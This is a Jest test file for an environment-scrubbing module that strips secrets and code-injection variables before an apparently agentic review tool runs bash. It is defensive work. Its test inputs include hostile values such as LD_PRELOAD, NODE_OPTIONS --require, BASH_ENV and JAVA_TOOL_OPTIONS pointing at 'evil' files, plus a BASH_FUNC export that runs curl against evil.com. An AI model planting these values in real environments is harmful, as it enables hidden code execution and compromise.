import {
  applyEnvScrub,
  makeCleanEnv,
  scrubEnv,
} from '../../../../../../../src/stages/review/agentic/tools/bash/env-scrub';

describe('scrubEnv', () => {
  test('drops GITHUB_TOKEN', () => {
    const { env, dropped } = scrubEnv({ GITHUB_TOKEN: 'ghp_xxxx', PATH: '/usr/bin' });
    expect(env['GITHUB_TOKEN']).toBeUndefined();
    expect(dropped).toContain('GITHUB_TOKEN');
  });

  test('drops ANTHROPIC_API_KEY', () => {
    const { env, dropped } = scrubEnv({ ANTHROPIC_API_KEY: 'sk-ant-xxx', PATH: '/usr/bin' });
    expect(env['ANTHROPIC_API_KEY']).toBeUndefined();
    expect(dropped).toContain('ANTHROPIC_API_KEY');
  });

  test('drops *_TOKEN suffix vars', () => {
    const { env } = scrubEnv({ NPM_TOKEN: 'xxx', MY_SERVICE_TOKEN: 'yyy', PATH: '/usr/bin' });
    expect(env['NPM_TOKEN']).toBeUndefined();
    expect(env['MY_SERVICE_TOKEN']).toBeUndefined();
  });

  test('drops *_SECRET suffix vars', () => {
    const { env } = scrubEnv({ APP_SECRET: 'xxx', PATH: '/usr/bin' });
    expect(env['APP_SECRET']).toBeUndefined();
  });

  test('drops *_KEY suffix vars', () => {
    const { env } = scrubEnv({ STRIPE_API_KEY: 'sk_live_xxx', PATH: '/usr/bin' });
    expect(env['STRIPE_API_KEY']).toBeUndefined();
  });

  test('drops AWS_ prefixed vars', () => {
    const { env } = scrubEnv({ AWS_ACCESS_KEY_ID: 'AKIA...', PATH: '/usr/bin' });
    expect(env['AWS_ACCESS_KEY_ID']).toBeUndefined();
  });

  test('keeps PATH', () => {
    const { env } = scrubEnv({ PATH: '/usr/bin:/bin', GITHUB_TOKEN: 'xxx' });
    expect(env['PATH']).toBe('/usr/bin:/bin');
  });

  test('keeps CI', () => {
    const { env } = scrubEnv({ CI: 'true', GITHUB_TOKEN: 'xxx' });
    expect(env['CI']).toBe('true');
  });

  test('keeps GITHUB_ACTIONS (non-secret metadata)', () => {
    const { env } = scrubEnv({ GITHUB_ACTIONS: 'true', GITHUB_TOKEN: 'secret' });
    expect(env['GITHUB_ACTIONS']).toBe('true');
    expect(env['GITHUB_TOKEN']).toBeUndefined();
  });

  test('keeps GITHUB_SHA', () => {
    const { env } = scrubEnv({ GITHUB_SHA: 'abc123', GITHUB_TOKEN: 'secret' });
    expect(env['GITHUB_SHA']).toBe('abc123');
  });

  test('injects GIT_CONFIG_NOSYSTEM=1', () => {
    const { env } = scrubEnv({});
    expect(env['GIT_CONFIG_NOSYSTEM']).toBe('1');
  });

  test('injects GIT_TERMINAL_PROMPT=0', () => {
    const { env } = scrubEnv({});
    expect(env['GIT_TERMINAL_PROMPT']).toBe('0');
  });

  test('injects GIT_CONFIG_GLOBAL when path provided', () => {
    const { env } = scrubEnv({}, '/tmp/test-gitconfig');
    expect(env['GIT_CONFIG_GLOBAL']).toBe('/tmp/test-gitconfig');
  });

  test('GIT_CEILING_DIRECTORIES defaults to /workspace when workspaceRoot is absent', () => {
    const { env } = scrubEnv({});
    expect(env['GIT_CEILING_DIRECTORIES']).toBe('/workspace');
  });

  test('GIT_CEILING_DIRECTORIES is parent of workspaceRoot for CI layout', () => {
    const { env } = scrubEnv({}, undefined, '/workspace/pr');
    expect(env['GIT_CEILING_DIRECTORIES']).toBe('/workspace');
  });

  test('GIT_CEILING_DIRECTORIES is parent of workspaceRoot for local checkout', () => {
    const { env } = scrubEnv({}, undefined, '/home/runner/work/my-repo/my-repo');
    expect(env['GIT_CEILING_DIRECTORIES']).toBe('/home/runner/work/my-repo');
  });

  test('sets QUALOPS_ENV_SCRUBBED=1', () => {
    const { env } = scrubEnv({});
    expect(env['QUALOPS_ENV_SCRUBBED']).toBe('1');
  });

  test('idempotent: QUALOPS_ENV_SCRUBBED=1 survives scrub', () => {
    const { env } = scrubEnv({ QUALOPS_ENV_SCRUBBED: '1' });
    expect(env['QUALOPS_ENV_SCRUBBED']).toBe('1');
  });

  // Code-execution startup-injection vectors
  test('drops BASH_ENV — bash sources this for every non-interactive shell', () => {
    const { env, dropped } = scrubEnv({ BASH_ENV: '/tmp/evil.sh', PATH: '/usr/bin' });
    expect(env['BASH_ENV']).toBeUndefined();
    expect(dropped).toContain('BASH_ENV');
  });

  test('drops ENV — POSIX sh/dash equivalent of BASH_ENV', () => {
    const { env, dropped } = scrubEnv({ ENV: '/tmp/evil.sh', PATH: '/usr/bin' });
    expect(env['ENV']).toBeUndefined();
    expect(dropped).toContain('ENV');
  });

  test('drops NODE_OPTIONS — --require/--loader executes code on every node invocation', () => {
    const { env, dropped } = scrubEnv({
      NODE_OPTIONS: '--require /tmp/evil.js',
      PATH: '/usr/bin',
    });
    expect(env['NODE_OPTIONS']).toBeUndefined();
    expect(dropped).toContain('NODE_OPTIONS');
  });

  test('drops PYTHONSTARTUP', () => {
    const { env, dropped } = scrubEnv({ PYTHONSTARTUP: '/tmp/evil.py', PATH: '/usr/bin' });
    expect(env['PYTHONSTARTUP']).toBeUndefined();
    expect(dropped).toContain('PYTHONSTARTUP');
  });

  test('drops RUBYOPT — -r flag loads arbitrary files', () => {
    const { env, dropped } = scrubEnv({ RUBYOPT: '-r/tmp/evil', PATH: '/usr/bin' });
    expect(env['RUBYOPT']).toBeUndefined();
    expect(dropped).toContain('RUBYOPT');
  });

  test('drops PERL5OPT — -M flag loads arbitrary modules', () => {
    const { env, dropped } = scrubEnv({ PERL5OPT: '-M/tmp/evil', PATH: '/usr/bin' });
    expect(env['PERL5OPT']).toBeUndefined();
    expect(dropped).toContain('PERL5OPT');
  });

  test('drops JAVA_TOOL_OPTIONS — JVM agent injection', () => {
    const { env, dropped } = scrubEnv({
      JAVA_TOOL_OPTIONS: '-javaagent:/tmp/evil.jar',
      PATH: '/usr/bin',
    });
    expect(env['JAVA_TOOL_OPTIONS']).toBeUndefined();
    expect(dropped).toContain('JAVA_TOOL_OPTIONS');
  });

  // Dynamic linker injection
  test('drops LD_PRELOAD — shared library injection on Linux', () => {
    const { env, dropped } = scrubEnv({ LD_PRELOAD: '/tmp/evil.so', PATH: '/usr/bin' });
    expect(env['LD_PRELOAD']).toBeUndefined();
    expect(dropped).toContain('LD_PRELOAD');
  });

  test('drops LD_AUDIT — audit interface injection on Linux', () => {
    const { env, dropped } = scrubEnv({ LD_AUDIT: '/tmp/evil.so', PATH: '/usr/bin' });
    expect(env['LD_AUDIT']).toBeUndefined();
    expect(dropped).toContain('LD_AUDIT');
  });

  test('drops DYLD_INSERT_LIBRARIES — shared library injection on macOS', () => {
    const { env, dropped } = scrubEnv({
      DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib',
      PATH: '/usr/bin',
    });
    expect(env['DYLD_INSERT_LIBRARIES']).toBeUndefined();
    expect(dropped).toContain('DYLD_INSERT_LIBRARIES');
  });

  // Bash function export injection
  test('drops BASH_FUNC_* exports — bash loads these as functions on startup', () => {
    const { env, dropped } = scrubEnv({
      'BASH_FUNC_evil%%': '() { curl evil.com; }',
      PATH: '/usr/bin',
    });
    expect(env['BASH_FUNC_evil%%']).toBeUndefined();
    expect(dropped).toContain('BASH_FUNC_evil%%');
  });

  // Safe vars that should still pass through
  test('LD_LIBRARY_PATH is kept — library resolution path, no startup execution risk', () => {
    const { env } = scrubEnv({ LD_LIBRARY_PATH: '/opt/lib', PATH: '/usr/bin' });
    expect(env['LD_LIBRARY_PATH']).toBe('/opt/lib');
  });

  test('DYLD_LIBRARY_PATH is kept — library resolution path, no startup execution risk', () => {
    const { env } = scrubEnv({ DYLD_LIBRARY_PATH: '/opt/lib', PATH: '/usr/bin' });
    expect(env['DYLD_LIBRARY_PATH']).toBe('/opt/lib');
  });
});

describe('applyEnvScrub', () => {
  let savedScrubbed: string | undefined;
  let savedDebug: string | undefined;

  beforeEach(() => {
    savedScrubbed = process.env['QUALOPS_ENV_SCRUBBED'];
    savedDebug = process.env['QUALOPS_DEBUG_ENV_SCRUB'];
    delete process.env['QUALOPS_ENV_SCRUBBED'];
    delete process.env['QUALOPS_DEBUG_ENV_SCRUB'];
  });

  afterEach(() => {
    if (savedScrubbed !== undefined) process.env['QUALOPS_ENV_SCRUBBED'] = savedScrubbed;
    else delete process.env['QUALOPS_ENV_SCRUBBED'];
    if (savedDebug !== undefined) process.env['QUALOPS_DEBUG_ENV_SCRUB'] = savedDebug;
    else delete process.env['QUALOPS_DEBUG_ENV_SCRUB'];
  });

  test('is a no-op when already scrubbed', () => {
    process.env['QUALOPS_ENV_SCRUBBED'] = '1';
    expect(() => applyEnvScrub()).not.toThrow();
  });

  test('applies scrub and sets QUALOPS_ENV_SCRUBBED', () => {
    applyEnvScrub();
    expect(process.env['QUALOPS_ENV_SCRUBBED']).toBe('1');
  });

  test('writes dropped vars to stderr when QUALOPS_DEBUG_ENV_SCRUB=1', () => {
    process.env['QUALOPS_DEBUG_ENV_SCRUB'] = '1';
    process.env['GITHUB_TOKEN'] = 'ghp_secret';
    const stderrSpy = jest.spyOn(process.stderr, 'write').mockImplementation(() => true);
    applyEnvScrub();
    expect(stderrSpy).toHaveBeenCalled();
    stderrSpy.mockRestore();
    delete process.env['GITHUB_TOKEN'];
  });
});

describe('makeCleanEnv', () => {
  test('returns env with QUALOPS_ENV_SCRUBBED and extra keys merged', () => {
    const result = makeCleanEnv('/tmp/gitconfig', { MY_EXTRA: 'value' });
    expect(result['QUALOPS_ENV_SCRUBBED']).toBe('1');
    expect(result['MY_EXTRA']).toBe('value');
  });
});
